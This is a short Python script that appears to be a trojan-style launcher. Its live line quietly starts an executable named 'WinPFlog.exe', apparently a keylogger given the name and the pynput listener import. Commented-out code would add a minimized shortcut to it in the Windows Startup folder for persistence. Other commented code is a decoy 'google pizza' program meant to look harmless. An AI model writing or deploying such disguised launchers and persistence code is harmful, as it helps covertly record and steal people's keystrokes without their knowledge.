from multiprocessing import Queue  # so cx_freeze wont cry
from pynput.mouse import Button, Controller
from pynput.keyboard import Key, Controller,Listener
import time
import win32com.client
import os
import subprocess

cwd = os.getcwd()
# appdata = os.getenv('APPDATA')

# desktop = r'C:\Users\Grisha\Desktop' # path to where you want to put the .lnk
# path = appdata+'\Microsoft\Windows\Start Menu\Programs\Startup\WinPFlog.lnk'
# target = os.path.join(cwd, 'WinPFlog.exe')
# icon = r'C:\path\to\icon\resource.ico' # not needed, but nice

# shell = win32com.client.Dispatch("WScript.Shell")
# shortcut = shell.CreateShortCut(path)
# shortcut.Targetpath = target
# shortcut.IconLocation = icon
# shortcut.WindowStyle = 7 # 7 - Minimized, 3 - Maximized, 1 - Normal
# shortcut.save()

# os.system(os.path.join(cwd, 'main.exe'))
subprocess.Popen(cwd+'\WinPFlog.exe')

# keyboard = Controller()
# mouse = Controller()

# print("Hello this is amazing python program!")
# print("Type enter to begin")

# x = input()

# print("I will google pizza for you!")
# time.sleep(1)
# print("Ok lets go!")

# keyboard.press(Key.cmd_l)
# keyboard.press('r')
# keyboard.release(Key.cmd_l)
# keyboard.release('r')

# time.sleep(1)

# keyboard.type("chrome")

# time.sleep(1)

# keyboard.press(Key.enter)
# keyboard.release(Key.enter)

# time.sleep(3)

# keyboard.type("pizza")

# time.sleep(1)

# keyboard.press(Key.enter)
# keyboard.release(Key.enter)